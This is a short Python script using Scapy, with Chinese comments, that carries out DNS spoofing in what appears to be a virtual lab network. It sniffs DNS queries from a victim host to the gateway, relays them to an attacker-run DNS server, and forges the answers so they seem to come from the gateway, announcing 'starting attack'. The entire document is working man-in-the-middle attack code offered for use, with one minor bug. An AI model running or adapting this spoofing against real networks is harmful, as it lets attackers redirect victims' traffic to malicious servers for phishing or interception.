from scapy.all import *
 
# dns 欺骗
wlan2="VMware Virtual Ethernet Adapter for VMnet8"
dns_server="192.168.146.130"  # win2008已搭好的dns服务器
dnsdst=""
def rev(p):
    global dnsdst
    try:
        pip=p[IP]
        pudp=[UDP]
        pdns=p[DNS]
        if p.dport==53 and pip.dst=="192.168.146.2":# 这个包是win7向网关的请求包 
            dnsdst=pip.src  
            send(IP(src="192.168.146.1",dst=dns_server,ttl=55)/UDP(sport=p[UDP].sport,dport=53)/pdns,iface=wlan2)
            print("转发查询信息成功",dnsdst)
        elif p.sport==53 and pip.src==dns_server:  #这一个包是搭建的DNS给自己回的包
            #print(dnsdst)
            send(IP(src="192.168.146.2",dst="192.168.146.129",ttl=55)/UDP(sport=53,dport=p[UDP].dport)/pdns,iface=wlan2)
            print("转发响应信息成功")
    except :
        pass
print("开始攻击")
sniff(iface=wlan2,filter="udp  port 53",timeout=300,prn=rev)
